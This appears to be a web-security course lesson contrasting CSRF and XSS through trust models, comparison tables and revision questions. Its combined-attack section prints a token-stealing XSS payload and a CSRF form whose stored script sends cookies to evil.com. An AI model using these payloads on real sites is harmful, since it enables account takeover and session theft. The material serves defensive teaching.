# Unit 7: Cross-Site Request Forgery (CSRF) - Topic 2: CSRF vs XSS

## Overview

CSRF and XSS are frequently confused but exploit fundamentally different trust relationships. CSRF abuses the server's trust in the browser; XSS abuses the user's trust in the website. Understanding the differences is critical for applying correct mitigations, as defenses for one do not protect against the other.

---

## 1. The Trust Model

```
CSRF — Exploits server's trust in the browser
+-----------------+    forged request    +-----------------+
| Attacker's Site |--------------------->| Target Server   |
+-----------------+  (victim's cookie)   +-----------------+
                                          Server trusts cookie → ACTION EXECUTED

XSS — Exploits user's trust in the website
+-----------------+    injected script   +-----------------+
| Target Server   |--------------------->| Victim Browser  |
+-----------------+  (runs in context)   +-----------------+
                                          Browser trusts origin → DATA STOLEN
```

---

## 2. Key Differences Comparison

| Aspect                | CSRF                                  | XSS                                    |
|-----------------------|---------------------------------------|-----------------------------------------|
| **Trust Exploited**   | Server trusts user's browser          | Browser trusts the website              |
| **Attack Vector**     | Forged cross-origin request           | Injected malicious script               |
| **Code Execution**    | No code runs in victim's browser      | JavaScript executes in browser          |
| **Authentication**    | Rides on existing session cookie      | Can steal session tokens directly       |
| **Data Exfiltration** | Cannot read responses                 | Full DOM, cookies, and page access      |
| **Same-Origin Policy**| Request sent, response blocked        | Script runs within same origin          |
| **Server Flaw**       | Missing CSRF token validation         | Missing input sanitization/encoding     |
| **HttpOnly Bypass**   | Not applicable (uses cookies)         | HttpOnly blocks cookie theft            |
| **CSP Impact**        | CSP does not prevent CSRF             | Strict CSP blocks inline scripts        |
| **Detection**         | Harder — requests appear legitimate   | Easier — anomalous scripts visible      |

---

## 3. When Each Attack Applies

```
              Need to READ data?
              /                \
            YES                 NO
            /                     \
      XSS Required          Need state change?
                             /              \
                           YES               NO
                           /                   \
                     CSRF Sufficient      No attack needed
                           |
                     Tokens present?
                     /              \
                   YES               NO
                   /                   \
             Need XSS to          CSRF directly
             steal token
```

**CSRF applies when:** cookie-based auth, predictable parameters, attacker only needs to trigger an action.

**XSS applies when:** user input reflected/stored without encoding, attacker needs to read data or perform complex operations.

---

## 4. Combined Attack Scenarios

### XSS to Bypass CSRF Protection

```javascript
// XSS payload extracts CSRF token, then forges request
fetch('/account/settings')
  .then(r => r.text())
  .then(html => {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const token = doc.querySelector('input[name="csrf_token"]').value;
    fetch('/account/change-email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: `email=attacker@evil.com&csrf_token=${token}`
    });
  });
```

### CSRF to Inject Stored XSS

```html
<!-- CSRF forces victim to save XSS payload in their profile -->
<form action="https://target.com/profile/update" method="POST" id="inject">
  <input type="hidden" name="bio"
    value='<script>document.location="https://evil.com/steal?c="+document.cookie</script>' />
</form>
<script>document.getElementById('inject').submit();</script>
```

### Self-XSS + CSRF Chain

CSRF can turn harmless Self-XSS into exploitable stored XSS by forcing the victim to submit the payload into their own profile.

---

## 5. Risk Comparison

| Risk Factor         | CSRF                        | XSS                             |
|----------------------|-----------------------------|----------------------------------|
| **Confidentiality**  | Low — cannot read data      | Critical — full data access      |
| **Integrity**        | High — can modify state     | Critical — can modify anything   |
| **Account Takeover** | Indirect (via email change) | Direct (steal session)           |
| **Wormability**      | Low                         | High (e.g., Samy worm)          |
| **OWASP Severity**   | Medium-High                 | High-Critical                    |

### Defense Coverage

| Defense Mechanism        | CSRF? | XSS? |
|--------------------------|:-----:|:-----:|
| CSRF Tokens              | ✅    | ❌    |
| SameSite Cookies         | ✅    | ❌    |
| Output Encoding          | ❌    | ✅    |
| Content Security Policy  | ❌    | ✅    |
| Custom Request Headers   | ✅    | ❌    |
| Origin/Referer Validation| ✅    | ❌    |

> **Key Insight:** XSS can defeat CSRF defenses (by reading tokens), but CSRF cannot defeat XSS defenses. Fix XSS first.

---

## Summary Table

| Concept                  | Key Takeaway                                                |
|--------------------------|-------------------------------------------------------------|
| **Trust Model**          | CSRF abuses server trust; XSS abuses browser trust          |
| **Data Access**          | CSRF is blind (no response); XSS has full DOM access        |
| **Primary Defense**      | CSRF → tokens/SameSite; XSS → encoding/CSP                 |
| **Combined Attacks**     | XSS can extract CSRF tokens, defeating CSRF protection      |
| **Risk Priority**        | Fix XSS first — it cascades to bypass CSRF defenses         |
| **Self-XSS Escalation** | CSRF can turn Self-XSS into exploitable stored XSS          |

---

## Revision Questions

1. Explain the trust relationship difference between CSRF and XSS using a real-world analogy.
2. An app has CSRF tokens but is vulnerable to reflected XSS. How could an attacker chain these to perform an unauthorized transfer?
3. Why does HttpOnly protect against XSS cookie theft but not CSRF?
4. A Self-XSS exists on a profile page that also lacks CSRF protection. Explain the chained attack.
5. Compare CVSS impact scores for typical CSRF vs stored XSS. Which CIA components does each affect?
6. If you could implement only ONE defense, would you choose CSRF tokens or CSP? Justify.

---

*Previous: [01-csrf-mechanism.md](01-csrf-mechanism.md) | Next: [03-token-based-protection.md](03-token-based-protection.md)*

---

*[Back to README](../README.md)*
